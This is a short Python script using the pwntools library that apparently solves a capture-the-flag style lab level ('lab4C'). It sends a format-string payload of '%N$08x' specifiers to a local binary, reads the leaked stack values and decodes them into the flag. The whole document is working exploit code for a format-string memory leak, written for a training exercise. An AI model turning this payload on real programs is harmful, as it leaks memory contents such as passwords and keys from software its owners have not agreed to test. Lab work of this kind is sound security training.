from pwn import *

r = process(["/tmp/transcen/r.sh", "/levels/lab04/lab4C"])

r.sendline("%29$08x.%30$08x.%31$08x.%32$08x.%33$08x.%34$08x.%35$08x.%36$08x")
r.send("\n")
r.readuntil("\n")
r.readuntil("\n")
r.readuntil("\n")
r.readuntil("\n")
r.readuntil("\n")

string = r.readline()
string = string[:72]
string = string.split(".")

flag = ""

for substring in string:
    flag += p32(int(substring, 16))

flag = flag.replace("\x00", "")
log.info("Flag: {}".format(flag))

r.close()

